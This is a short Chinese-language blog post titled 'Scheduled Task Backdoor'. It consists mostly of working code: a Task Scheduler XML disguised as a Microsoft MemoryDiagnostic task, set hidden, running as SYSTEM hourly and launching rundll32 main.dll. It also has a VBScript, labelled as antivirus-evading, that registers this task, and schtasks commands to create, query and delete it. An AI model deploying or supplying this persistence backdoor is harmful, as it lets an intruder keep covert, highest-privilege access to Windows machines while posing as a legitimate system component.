---
author: XhstormR
categories:
- security
date: 2019-10-04T14:00:20+08:00
title: 计划任务 Backdoor
---

<!--more-->

Updated on 2019-10-04

## 123.xml
```xml
<?xml version="1.0" ?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Source>Microsoft Corporation</Source>
    <Author>Microsoft Corporation</Author>
    <URI>\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2000-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>0</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%windir%\system32\rundll32.exe</Command>
      <Arguments>main.dll msg</Arguments>
    </Exec>
  </Actions>
</Task>
```

### Reference
* https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema
* https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/security-identifiers

## 注册任务

### 脚本（免杀）

#### 123.vbs

```
Set service = CreateObject("Schedule.Service")
service.Connect

Set file = CreateObject("Scripting.FileSystemObject").OpenTextFile("123.xml")
text = file.ReadAll
file.Close

Set rootFolder = service.GetFolder("\")
rootFolder.RegisterTask "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents", text, 6, , , 5
```

```bash
cscript.exe //Nologo 123.vbs

wscript.exe：输出至 Windows，
cscript.exe：输出至 Console。
```

#### Reference
* https://ss64.com/vb/filesystemobject.html
* https://docs.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants
* https://docs.microsoft.com/zh-cn/office/vba/language/reference/user-interface-help/filesystemobject-object
* https://github.com/DoctorLai/VBScript_Obfuscator

### 工具
```
schtasks.exe /create /tn "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" /f /xml 123.xml
schtasks.exe /query  /tn "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" /v /fo list
schtasks.exe /delete /tn "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" /f
```
